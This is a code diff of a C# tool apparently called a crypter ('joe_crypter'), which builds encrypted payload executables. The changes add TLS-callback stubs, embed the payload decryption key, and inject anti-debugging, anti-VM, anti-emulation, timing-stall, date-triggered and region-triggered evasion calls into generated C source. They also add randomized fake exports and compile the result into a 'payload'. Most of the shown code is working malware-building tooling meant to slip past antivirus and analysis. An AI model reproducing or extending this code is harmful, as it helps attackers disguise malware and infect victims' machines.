@@ -640,7 +640,7 @@ namespace Exe_Morphing_Util
             // ok, new section crearted, added crap to it, plus jump home
             // no, we're doing the C compiler / runpe method. fuck doing it outselves in C#
 
-            MessageBox.Show("All Done!", "=]");
+            //MessageBox.Show("All Done!", "=]");
         }
         private uint ImportHintNameTableRVA(PeHeaderReader lolpe)
         { 
@@ -668,32 +668,195 @@ namespace Exe_Morphing_Util
             // with long jmp to our found code cave, have it jump back when done to our EP
             if(cbTLS.Checked)
             {
-                /*
-                string randofuncname = RandomString(9);
                 File.Copy("barebones\\dont_touch_me_TLS_callbacks.joe", "builder\\joe_crypter.c", true);
-                StreamWriter jw = new StreamWriter("builder\\joe_crypter.c", true);
-                //jw.finsih me soon */
+            
+                string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
+                replacecrypto = replacecrypto.Replace("cryptokey",payloadcryptkey.ToString());
+                replacecrypto = replacecrypto.Replace("changemealreadyincode", RandomStringJustChars(12)); // TLS CALLBACK func NAME
+                File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
+
+                FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
+                StreamWriter sw = new StreamWriter(fs);
+                // make adjustments to file based on checkboxes
+
+                // now we do our evasions
+                fs.Seek(1912, SeekOrigin.Begin);  // be mindful of where this is. 
+
+                if (cbAntiDebug.Checked)
+                {
+                    sw.WriteLine("checkQIP();");
+                    sw.WriteLine("if (GetNtGlobalFlags() == 'p')");
+                    sw.WriteLine("{");
+                    sw.WriteLine("PassToNoobs();");
+                    sw.WriteLine("}");
+                    sw.WriteLine("if (GetBeingDebugged())");
+                    sw.WriteLine("{");
+                    sw.WriteLine("PassToNoobs();");
+                    sw.WriteLine("}");
+                    sw.WriteLine("GetHeapFlags();");
+                    sw.WriteLine("AnotherAntiDebugRoutine();");
+                    sw.WriteLine("GS_Check();");
+                }
+                if (cbAntiEmu.Checked)
+                {
+                    sw.WriteLine("AntiEmu();");
+                }
+                if (cbAntiVM.Checked)
+                {
+                    sw.WriteLine("special_usercheck();");
+                    sw.WriteLine("MemSizeTrick();");
+                    sw.WriteLine("if (IsInsideVMWare())");
+                    sw.WriteLine("{");
+                    sw.WriteLine("PassToNoobs();");
+                    sw.WriteLine("}");
+                    sw.WriteLine("reg_enum_vm_check();");
+                    sw.WriteLine("anti_vm_wmi();");
+                }
+                if (cbSpecial.Checked)
+                {
+                    sw.WriteLine("JoeSpecial();");
+
+                }
+
+                if(cbCores.Checked)
+                {
+                    sw.WriteLine("CheckCoreCount();");
+                }
+
+                if (cbFLS.Checked)
+                {
+                    sw.WriteLine("FlsTrick();");
+                }
+                if (cbLongStall.Checked)
+                {
+                    sw.WriteLine("LongStall();");
+                    sw.WriteLine("timing_evasion_1();");
+                }
+                if (cbSpecialStall.Checked)
+                {
+                    // pick 1 of 5 randomly, timing_evasion_2-6
+                    Random ran = new Random();
+                    int rando = ran.Next(2, 6);
+                    switch (rando)
+                    {
+                        case 2:
+                            sw.WriteLine("timing_evasion_2();");
+                            break;
+                        case 3:
+                            sw.WriteLine("timing_evasion_3();");
+                            break;
+                        case 4:
+                            sw.WriteLine("timing_evasion_4();");
+                            break;
+                        case 5:
+                            sw.WriteLine("timing_evasion_5();");
+                            break;
+                        case 6:
+                            sw.WriteLine("timing_evasion_6();");
+                            break;
+                    }
 
 
+                }
+               
+                if (cbMallocTrick.Checked)
+                {
+                    sw.WriteLine("AllocMem_Fornoreason();");
+                }
+                if (cbNuma.Checked)
+                {
+                    sw.WriteLine("NumaEvas();");
+                }
+                if (cbProcessMem.Checked)
+                {
+                    sw.WriteLine("procmem_evas();");
+                }
+                if (cbDateSpecific.Checked)
+                {
+                    sw.WriteLine("date_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
+                }
+                if (cbRegionSpecific.Checked)
+                {
+                    sw.WriteLine("region_specific_check(\"" + cbRegion.SelectedText + "\");");
+                }
+
+                sw.Close(); fs.Close();
+                // placing this here because objects are using the file, breaks shit
+                if (cbFakeWindows.Checked)
+                {
+                    String replacelotsofwindows = File.ReadAllText("builder\\joe_crypter.c");
+                    replacelotsofwindows = replacelotsofwindows.Replace("//lotsofwindowshack", "LotsOfWindows(hwnd);");
+                    File.WriteAllText("builder\\joe_crypter.c", replacelotsofwindows);
+                    //sw.WriteLine("LotsOfWindows(hwnd);");
+                }
+                if (cbFakeExports.Checked)
+                {
+
+                    string[] datatype, returntype;
+
+                    Random rand = new Random();
+
+                    int x = rand.Next(1, 9); // random number of exports
+                    for (int y = 0; y <= x; y++)
+                    {
+
+                        string randofuncname = RandomStringJustChars(rand.Next(5, 15));
+                        string randomargumentname = RandomStringJustChars(rand.Next(5, 15));
+                        datatype = new string[5] { "int", "char*", "float", "double", "long" };
+                        returntype = new string[5] { "int", "char*", "float", "double", "long" };
+                        int q = rand.Next(0, 99999); // q is datatype
+                        int r = rand.Next(1, 5); // r is data type or function arguments
+                        int s = rand.Next(1, 5); // s is return type
+                        string text = File.ReadAllText("builder\\joe_crypter.c");
+
+
+                        text = text.Replace("//replaceatbeginning" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ");");
+
+
+                        if (returntype[s] == "char*")
+                        {
+                            text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { " +
+                                "\r\n \r\n __asm{ \r\n jmp eax \r\n } \r\n" +
+                                "return \"" + RandomStringJustChars(rand.Next(5, 15)) + "\"; \r\n }\r\n //");
+
+                        }
+                        else
+                        {
+                            text = text.Replace("//replacemeatend" + y.ToString(), "__declspec(dllexport) " + returntype[s] + " " + randofuncname + "(" + datatype[r] + " " + randomargumentname + ")" + "\r\n { \r\n" +
+                                "\r\n \r\n __asm{ \r\n jmp ebx \r\n } \r\n" + "return " + q + "; \r\n }\r\n //");
+
+                        }
+                        File.WriteAllText("builder\\joe_crypter.c", text);
+
+
+                    }
+
+                }
+
+                return;
             }
+            // no tls? go here. Just placing it here to make it easier. 
+            evasions_no_tls();
+
+
+        }
+        private void evasions_no_tls()
+        {
             File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
             StreamWriter sw = new StreamWriter(fs);
 
 
+            // set payload cryptokey
+            string replacecrypto = File.ReadAllText("builder\\joe_crypter.c");
+            replacecrypto = replacecrypto.Replace("cryptokey", payloadcryptkey.ToString());
+            File.WriteAllText("builder\\joe_crypter.c", replacecrypto);
 
             // make adjustments to file based on checkboxes
-            // start by placing the string key in the file for decryption
-            // fs.Seek(0, SeekOrigin.Current); // rewind.............. does nothing
-            // head banging bug - WHY THE FUCK DOES IT WRITE WAY THE FUCK AT POS 1736? 
-            // its SUPPOSED to write at the BEGINNING of the file, but NOOOOOO,  some bug, who the FUCK KNOWS. fine, code it another way. 
-           
-            fs.Seek(1035, SeekOrigin.Current);
-            sw.Write("                                               ");
-            sw.WriteLine("int cryptokey = " + payloadcryptkey + ";");
+
             // now we do our evasions
-            fs.Seek(1736, SeekOrigin.Begin);
-           
+            fs.Seek(1981, SeekOrigin.Begin);
+
             if (cbAntiDebug.Checked)
             {
                 sw.WriteLine("checkQIP();");
@@ -729,6 +892,12 @@ namespace Exe_Morphing_Util
                 sw.WriteLine("JoeSpecial();");
 
             }
+
+            if (cbCores.Checked)
+            {
+                sw.WriteLine("CheckCoreCount();");
+            }
+
             if (cbFakeWindows.Checked)
             {
                 sw.WriteLine("LotsOfWindows(hwnd);");
@@ -768,7 +937,31 @@ namespace Exe_Morphing_Util
 
 
             }
-            if(cbFakeExports.Checked)
+            
+            if (cbMallocTrick.Checked)
+            {
+                sw.WriteLine("AllocMem_Fornoreason();");
+            }
+            if (cbNuma.Checked)
+            {
+                sw.WriteLine("NumaEvas();");
+            }
+            if (cbProcessMem.Checked)
+            {
+                sw.WriteLine("procmem_evas();");
+            }
+            if (cbDateSpecific.Checked)
+            {
+                sw.WriteLine("date_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
+            }
+            if (cbRegionSpecific.Checked)
+            {
+                sw.WriteLine("region_specific_check(\"" + cbRegion.SelectedText + "\");");
+            }
+
+            sw.Close(); fs.Close();
+
+            if (cbFakeExports.Checked)
             {
 
                 string[] datatype, returntype;
@@ -777,7 +970,7 @@ namespace Exe_Morphing_Util
 
                 int x = rand.Next(1, 9); // random number of exports
                 for (int y = 0; y <= x; y++)
-                { 
+                {
 
                     string randofuncname = RandomStringJustChars(rand.Next(5, 15));
                     string randomargumentname = RandomStringJustChars(rand.Next(5, 15));
@@ -811,29 +1004,6 @@ namespace Exe_Morphing_Util
                 }
 
             }
-            if (cbMallocTrick.Checked)
-            {
-                sw.WriteLine("AllocMem_Fornoreason();");
-            }
-            if (cbNuma.Checked)
-            {
-                sw.WriteLine("NumaEvas();");
-            }
-            if (cbProcessMem.Checked)
-            {
-                sw.WriteLine("procmem_evas();");
-            }
-            if (cbDateSpecific.Checked)
-            {
-                sw.WriteLine("datesp_ecific_check(\"" + cbRegion.SelectedText + "\");");
-            }
-            if (cbRegionSpecific.Checked)
-            {
-                sw.WriteLine("region_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
-            }
-
-            sw.Close();  fs.Close();
-            
 
 
         }
@@ -869,24 +1039,28 @@ namespace Exe_Morphing_Util
             sw.WriteLine("set PATH=%PellesCDir%\\Bin;%PATH%");
             sw.WriteLine("set INCLUDE=%PellesCDir%\\Include;%PellesCDir%\\Include\\Win;%INCLUDE%");
             sw.WriteLine("set LIB=%PellesCDir%\\Lib;%PellesCDir%\\Lib\\Win;%LIB%");
-			
-			// compile 
-			sw.WriteLine(compilerexe + " -std:C11 -Tx86-coff -Ot -Ob1 -fp:precise -W1 -Gz -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\"");
+
+            // compile -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze
+            sw.WriteLine(compilerexe + " -std:C11 -Tx86-coff -Os -Ox -Ob0 -fp:precise -W0 -Gz -Ze \"" + sourcepath + "\" -Fo\"" + objpath + "\""); // changed to no warnings. smaller code
 			// resources
             sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
 			// link
             sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
                 "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                 "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
-            sw.WriteLine("echo        _             _____                  _            ");
-            sw.WriteLine("echo       | |           / ____|                | |           ");
-            sw.WriteLine("echo       | | ___   ___| |     _ __ _   _ _ __ | |_ ___ _ __ ");
-            sw.WriteLine("echo   _   | |/ _\\ / _\\ |    | '__| | | | '_\\| __/ _\\ '__|");
-            sw.WriteLine("echo  | |__| | (_) |  __/ |____| |  | |_| | |_) | ||  __/ |   ");
-            sw.WriteLine("echo  \\____/\\_\\/\\__|\\_____|_|  \\__, | .__/\\_\\___|_|   ");
-            sw.WriteLine("echo                                  __/ | |                 ");
-            sw.WriteLine("echo                                 |___/|_|                 ");
-
+            sw.WriteLine("\r\n");
+            /*
+            sw.WriteLine(":::       _             _____                  _            ");
+            sw.WriteLine(":::      | |           / ____|                | |           ");
+            sw.WriteLine(":::      | | ___   ___| |     _ __ _   _ _ __ | |_ ___ _ __ ");
+            sw.WriteLine(":::  _   | |/ _\\ / _\\ |    | '__| | | | '_\\| __/ _\\ '__|");
+            sw.WriteLine("::: | |__| | (_) |  __/ |____| |  | |_| | |_) | ||  __/ |   ");
+            sw.WriteLine("::: \\____/\\___/\\___|\\____|_|  \\__, | .__/\\_\\___|_|   ");
+            sw.WriteLine(":::                                 __/ | |                 ");
+            sw.WriteLine(":::                                |___/|_|                 ");
+            sw.WriteLine(":::                                                         ");
+            sw.WriteLine("for /f \"delims =: tokens = *\" %%A in ('findstr /b ::: \" % ~f0\"') do @echo(%%A");
+            */
             sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
             sw.WriteLine("pause");
 			
@@ -1212,6 +1386,7 @@ namespace Exe_Morphing_Util
         }
         private void FormMain_Load(object sender, EventArgs e)
         {
+            FormMain.CheckForIllegalCrossThreadCalls = false;
             rbUnpackMeth1.Checked = true;
             //lbRegion.SelectedItem = 7;
             dtp.Value = dtp.Value.AddDays(7);
